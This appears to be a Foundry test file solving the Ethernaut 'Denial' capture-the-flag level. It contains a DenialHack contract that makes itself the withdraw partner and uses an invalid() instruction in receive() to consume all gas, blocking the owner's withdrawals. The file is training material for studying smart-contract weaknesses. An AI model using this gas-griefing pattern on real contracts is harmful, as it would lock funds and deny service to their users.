// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Denial/Denial.sol";
import "../src/Denial/DenialFactory.sol";
import "../src/Ethernaut.sol";

contract DenialTest is Test {
    Ethernaut private _ethernaut;
    DenialFactory private _denialFactory;
    Denial private _denial;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_denialFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance{value: 1 ether}(
            _denialFactory
        );
        _denial = Denial(payable(instance));
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_denial))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _denialFactory = new DenialFactory();
    }

    function testDenialHack() public testWrapper {
        DenialHack denialHack = new DenialHack(address(_denial));
        denialHack.attack();
        require(_denial.partner() == address(denialHack));
        require(_denial.contractBalance() >= 100 wei);
    }
}

contract DenialHack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        Denial(payable(target)).setWithdrawPartner(address(this));
    }

    receive() external payable {
        assembly {
            invalid() // All the remaining gas in this context is consumed.
        }
    }
}
